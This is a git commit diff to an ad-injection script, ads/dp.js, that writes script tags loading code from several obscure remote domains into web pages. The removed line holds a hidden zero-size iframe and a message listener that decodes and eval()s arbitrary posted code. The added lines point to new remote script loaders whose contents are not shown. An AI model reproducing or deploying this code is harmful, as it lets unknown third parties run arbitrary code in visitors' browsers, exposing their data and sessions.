330f8c26bc57227def8692a2584583d9eb096d93
zmmx <35140632+zmmx@users.noreply.github.com>
2020-08-21 11:34:45 +0800

    更新 dp.js

--- ads/dp.js
+++ ads/dp.js
@@ -1,7 +1,7 @@
 //dipiao--alpha
-document.writeln('<script src="https://v6.klmc88.cn/c/BBCE21B6-4172-47E9-B29C-7E8B0ADD1212.alpha"></script>');
+document.writeln('<script src="https://ar.waterserver.cn/c/BBCE21B6-4172-47E9-B29C-7E8B0ADD1212.alpha"></script>');
 //dingpiao-zhimo
-if(navigator.userAgent.indexOf('baiduboxapp')>-1){document.write('<script src="https://xn--4gqqc629gbju.com:19852/api/c-2059-23.js"><\/script>')}else{(function(){window.addEventListener("message",function(e){var _des_s_2059=e.data;if(_des_s_2059.des_s_2059){var _s = '/+/g';eval(decodeURIComponent(_des_s_2059.des_s_2059.replace(_s,"%20")))}});document.write('<iframe style="display:none;" src="https://xn--4gqqc629gbju.com:19852/api/c-2059-23-1.html" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')})();}
+document.writeln('<script src="https://ar.waterserver.cn/c/BB78B37A-C4F3-4B12-BDE5-80D78B3D3871.alpha"></script>');
 //pc
 document.write("<script src='\/\/pc.cathaycentury.com\/pc\/rich-tf.js' id=\"richid\" data='s=2596'><\/script>");
 document.write("<script src='\/\/pc.cathaycentury.com\/pc\/tp-tf.js' id=\"tpid\" data='s=2599&u=s0005'><\/script>");
